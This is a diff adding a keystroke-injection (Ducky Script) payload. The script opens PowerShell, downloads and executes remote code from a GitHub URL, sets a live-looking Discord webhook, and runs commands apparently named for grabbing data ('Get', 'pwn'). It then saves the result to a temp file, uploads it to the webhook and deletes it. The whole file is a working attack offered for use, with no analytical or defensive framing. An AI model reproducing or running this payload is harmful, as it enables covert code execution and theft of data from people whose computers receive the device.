@@ -1,0 +1,33 @@
+DELAY 40
+GUI r
+DELAY 40
+STRING powershell
+ENTER
+DELAY 800
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/0svix/www/refs/heads/main/www'))
+ENTER
+STRING $DiscordUrl = 'https://discord.com/api/webhooks/1305706593354256384/kOKYeEbjv1Z_UdKNXbWrQ-YX3J1UEmhY27cs1-1DBvw4GtXltsxJ2fWX5KZSC8xV2iPc'
+ENTER
+STRING Get
+ENTER
+DELAY 3600
+STRING pwn
+ENTER
+DELAY 200
+STRING Open
+ENTER
+DELAY 1800
+CTRL A
+CTRL S
+DELAY 1300
+STRING C:\temp\text.txt
+ENTER
+DELAY 600
+ALT F4
+DELAY 650
+STRING Upload -file "C:\temp\text.txt"
+ENTER
+STRING Delete
+ENTER
+STRING EXIT
+ENTER
